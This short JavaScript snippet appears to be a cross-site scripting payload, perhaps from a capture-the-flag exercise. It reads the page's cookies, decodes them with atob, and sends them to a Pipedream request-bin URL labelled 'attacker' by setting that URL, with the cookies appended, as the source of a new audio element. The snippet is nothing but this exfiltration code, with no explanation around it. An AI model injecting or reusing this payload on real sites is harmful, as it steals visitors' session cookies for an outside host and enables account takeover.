
attacker = "https://eolkkqvs1uis9pt.m.pipedream.net";

cookie = atob(document.cookie);

aud = document.createElement("audio");
aud.src = attacker + "/?" + cookie;

console.log(cookie);
